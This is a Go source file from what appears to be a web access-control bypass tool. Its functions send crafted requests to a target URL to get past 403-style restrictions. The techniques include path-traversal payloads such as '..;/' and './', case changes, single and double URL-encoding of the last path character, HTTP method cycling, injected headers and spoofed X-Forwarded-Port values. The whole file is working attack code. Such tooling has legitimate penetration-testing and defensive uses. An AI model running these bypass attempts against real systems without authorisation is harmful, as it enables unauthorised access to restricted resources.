package utils

import (
	"fmt"
	"log"
	"net"
	"os"
	"strings"
)

func SingleHeaderAttack(userSettings UserSettings, header string, method string) {
	// Send HTTP request for each method
	resp, err := HttpRequest(userSettings.Url.String(), method, header, userSettings)
	if err != nil {
		AttackHttpErrorHandling(err)
		return
	}

	// Handle the HTTP response
	HandleHTTPResponse(resp, header, userSettings, true)
}

func HttpMethodAttack(userSettings UserSettings, methods []string) {
	for _, method := range methods {
		// Send HTTP request for each method
		resp, err := HttpRequest(userSettings.Url.String(), method, "", userSettings)
		if err != nil {
			AttackHttpErrorHandling(err)
			return
		}
		// Handle the HTTP response
		HandleHTTPResponse(resp, "", userSettings, true)
	}
}

func HeaderAttack(userSettings UserSettings, headers []string) {
	for _, header := range headers {
		SingleHeaderAttack(userSettings, header, "GET")
	}
}

func UrlAfterAttack(userSettings UserSettings, payloadList []string) {
	// example: https://t.com/admin..;/
	for _, payload := range payloadList {
		newUrl := fmt.Sprintf("%s%s", userSettings.Url.String(), payload)

		// Send HTTP request for each method
		resp, err := HttpRequest(newUrl, "GET", "", userSettings)
		if err != nil {
			AttackHttpErrorHandling(err)
			return
		}
		// Handle the HTTP response
		HandleHTTPResponse(resp, "", userSettings, false)
	}
}

func UrlCapitalizeLastCharAttack(userSettings UserSettings) {
	// example: https://t.com/admiN
	newUrl := userSettings.Url.String()

	// Split the URL into segments
	segments := strings.Split(newUrl, "/")
	if len(segments) > 0 {
		lastSegment := segments[len(segments)-1]

		// Check if the last segment is not empty
		if len(lastSegment) > 0 {
			// Get the last character and capitalize it
			lastChar := lastSegment[len(lastSegment)-1:]
			capitalizedChar := strings.ToUpper(lastChar)

			// Replace the last character with the capitalized version
			newLastSegment := lastSegment[:len(lastSegment)-1] + capitalizedChar
			segments[len(segments)-1] = newLastSegment

			// Reconstruct the new URL
			newUrl = strings.Join(segments, "/")
		}
	}

	// Send HTTP request for each method
	resp, err := HttpRequest(newUrl, "GET", "", userSettings)
	if err != nil {
		AttackHttpErrorHandling(err)
		return
	}

	// Handle the HTTP response
	HandleHTTPResponse(resp, "", userSettings, false)
}

func UrlCapitalizeAttack(userSettings UserSettings) {
	// example: https://t.com/ADMIN
	newUrl := userSettings.Url.String()

	// Capitalize the last part of the path
	segments := strings.Split(newUrl, "/")
	if len(segments) > 0 {
		lastSegment := strings.ToUpper(segments[len(segments)-1])
		segments[len(segments)-1] = lastSegment
		newUrl = strings.Join(segments, "/")
	}

	// Send HTTP request for each method
	resp, err := HttpRequest(newUrl, "GET", "", userSettings)
	if err != nil {
		AttackHttpErrorHandling(err)
		return
	}
	// Handle the HTTP response
	HandleHTTPResponse(resp, "", userSettings, false)
}

func UrlLastCharUrlEncode(userSettings UserSettings) {
	// example: https://t.com/admi%6E
	newUrl := userSettings.Url.String()

	// Split the URL into segments
	segments := strings.Split(newUrl, "/")
	if len(segments) > 0 {
		// Get the last segment
		lastSegment := segments[len(segments)-1]

		// Check if the last segment is not empty
		if len(lastSegment) > 0 {
			// Get the last character
			lastChar := lastSegment[len(lastSegment)-1:]

			// Convert the last character to its ASCII value and then to a hex string
			encodedChar := fmt.Sprintf("%%%X", lastChar[0])

			// Replace the last character with its encoded representation
			newLastSegment := lastSegment[:len(lastSegment)-1] + encodedChar
			segments[len(segments)-1] = newLastSegment

			// Reconstruct the new URL
			newUrl = strings.Join(segments, "/")
		}
	}

	// Send HTTP request for each method
	resp, err := HttpRequest(newUrl, "GET", "", userSettings)
	if err != nil {
		AttackHttpErrorHandling(err)
		return
	}

	// Handle the HTTP response
	HandleHTTPResponse(resp, "", userSettings, false)
}

func UrlLastCharDoubleUrlEncode(userSettings UserSettings) {
	// example: https://t.com/admi%256E
	newUrl := userSettings.Url.String()

	// Split the URL into segments
	segments := strings.Split(newUrl, "/")
	if len(segments) > 0 {
		// Get the last segment
		lastSegment := segments[len(segments)-1]

		// Get the last character
		lastChar := lastSegment[len(lastSegment)-1:]

		// Convert the last character to its ASCII value and then to a hex string
		encodedChar := fmt.Sprintf("%%25%X", lastChar[0])

		// Replace the last character with its encoded representation
		newLastSegment := lastSegment[:len(lastSegment)-1] + encodedChar
		segments[len(segments)-1] = newLastSegment

		// Reconstruct the new URL
		newUrl = strings.Join(segments, "/")
	}

	// Send HTTP request for each method
	resp, err := HttpRequest(newUrl, "GET", "", userSettings)
	if err != nil {
		AttackHttpErrorHandling(err)
		return
	}

	// Handle the HTTP response
	HandleHTTPResponse(resp, "", userSettings, false)
}

func UrlBeforeAttack(userSettings UserSettings, payloadList []string) {
	// example: https://t.com/./admin
	hostWithProtocol := userSettings.Url.Scheme + "://" + userSettings.Url.Host

	for _, payload := range payloadList {
		modifiedPaths := insertPayloadInsidePath(userSettings.Url.Path, payload)
		for _, pathPayload := range modifiedPaths {
			newUrl := fmt.Sprintf("%s%s", hostWithProtocol, pathPayload)
			// Send HTTP request for each method
			resp, err := HttpRequest(newUrl, "GET", "", userSettings)
			if err != nil {
				AttackHttpErrorHandling(err)
				return
			}

			// Handle the HTTP response
			HandleHTTPResponse(resp, "", userSettings, false)
		}
	}
}

func XForwardedPortsAttack(userSettings UserSettings, portsList []string) {
	// port bypass X-Forwarded-Port: 8080
	for _, port := range portsList {
		newHeader := fmt.Sprintf("%s: %s", "X-Forwarded-Port", port)
		SingleHeaderAttack(userSettings, newHeader, "GET")
	}
}

func AttackHttpErrorHandling(err error) {
	// if strings.Contains(err.Error(), "An existing connection was forcibly closed by the remote host") {
	// 	return
	// }

	log.Printf("Failed to create HTTP request: %v", err)
	if dnsErr, ok := err.(*net.DNSError); ok && dnsErr.IsNotFound {
		os.Exit(1)
	}
}

func insertPayloadInsidePath(path string, payload string) (modifiedPaths []string) {
	pathParts := strings.Split(path, "/")

	for i := 1; i < len(pathParts); i++ {
		leftPath := strings.Join(pathParts[:i], "/")
		rightPath := strings.Join(pathParts[i:], "/")
		modifiedPath := leftPath + "/" + payload + rightPath
		modifiedPaths = append(modifiedPaths, modifiedPath)
	}

	return modifiedPaths
}
